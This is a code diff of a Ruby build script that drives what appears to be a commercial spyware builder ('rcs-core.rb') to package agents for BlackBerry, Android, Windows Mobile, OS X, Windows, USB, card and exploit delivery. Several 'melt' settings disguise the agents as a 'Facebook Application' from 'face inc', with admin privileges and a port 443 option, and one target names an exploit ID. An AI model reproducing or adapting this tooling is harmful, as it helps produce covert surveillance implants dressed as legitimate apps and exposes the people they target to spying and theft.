@@ -11,21 +11,13 @@ ver = DEMO ? '_demo' : ''
 
 puts "Building all complex..."
 ###################################################################################################
-params = {platform: 'wap',
-          generate: {platforms: ['blackberry', 'android', 'winmo'],
-                     binary: {demo: DEMO, admin: true},
-                     melt: {admin: true,
-                            appname: 'facebook',
-                            name: 'Facebook Application',
-                            desc: 'Applicazione utilissima di social network',
-                            vendor: 'face inc',
-                            version: '1.2.3'},
-                     sign: {edition: '5th3rd'}
-                    }
+params = {platform: 'anon',
+          binary: {demo: DEMO},
+          melt: {admin: true, port: 443}
           }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o anon#{ver}.zip"
 ###################################################################################################
 params = {platform: 'applet',
           generate: {platforms: ['osx', 'windows'],
@@ -37,6 +29,17 @@ params = {platform: 'applet',
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o applet#{ver}.zip"
+###################################################################################################
+params = {platform: 'upgrade',
+          generate: {platforms: ['windows'],
+                     binary: {demo: DEMO, admin: false},
+                     melt: {admin: false}
+                    },
+          melt: {appname: 'facebook'}
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o upgrade#{ver}.zip"
 ###################################################################################################
 params = {platform: 'card',
           generate: {platforms: ['winmo'],
@@ -74,6 +77,22 @@ params = {platform: 'usb',
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o usb#{ver}.zip"
+###################################################################################################
+params = {platform: 'wap',
+          generate: {platforms: ['blackberry', 'android', 'winmo'],
+                     binary: {demo: DEMO, admin: true},
+                     melt: {admin: true,
+                            appname: 'facebook',
+                            name: 'Facebook Application',
+                            desc: 'Applicazione utilissima di social network',
+                            vendor: 'face inc',
+                            version: '1.2.3'},
+                     sign: {edition: '5th3rd'}
+                    }
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
 ###################################################################################################
 params = {platform: 'exploit',
           generate: {exploit: 'HT-2012-000',
